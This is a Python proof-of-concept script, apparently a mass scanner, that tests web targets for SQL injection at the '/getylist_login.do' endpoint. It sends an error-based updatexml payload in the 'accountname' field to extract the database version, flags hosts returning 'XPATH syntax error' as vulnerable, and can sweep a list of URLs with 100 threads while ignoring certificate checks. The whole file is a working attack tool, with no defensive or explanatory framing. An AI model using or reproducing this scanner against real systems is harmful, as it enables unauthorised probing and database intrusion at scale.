import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    """主函数"""
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help='请输入你的url')
    parser.add_argument('-f','--file',type=str,help='请输入文件名')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
def banner():
    banner = """
 █     █░▓██   ██▓ ██▀███  ▓█████   ██████ ▄▄▄█████▓ ▒█████   ██▀███   ███▄ ▄███▓
▓█░ █ ░█░ ▒██  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒
▒█░ █ ░█   ▒██ ██░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░
░█░ █ ░█   ░ ▐██▓░▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██ 
░░██▒██▓   ░ ██▒▓░░██▓ ▒██▒░▒████▒▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒
░ ▓░▒ ▒     ██▒▒▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░
  ▒ ░ ░   ▓██ ░▒░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░
  ░   ░   ▒ ▒ ░░    ░░   ░    ░   ░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░   
    ░     ░ ░        ░        ░  ░      ░               ░ ░     ░            ░   
          ░ ░                                                                                                
                                            author:heichao
                                            version:1.0.0
"""
    print(banner)
def poc(target):
    url = target + "/getylist_login.do"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "79"
    }
    data = {
        "accountname":"test' and (updatexml(1,concat(0x7e,(select version()),0x7e),1));--);--"
    }
    try:
        response = requests.post(url=url,headers=headers,data=data,verify=False)
        if 'XPATH syntax error' in response.text:
            print(f"[+]{target}有SQL注入漏洞")
            # print(response.text)
        else:
            print(f"[-]{target} none")
    except:
        print(f"[*]{target} sever error")

if __name__ == '__main__':
    main()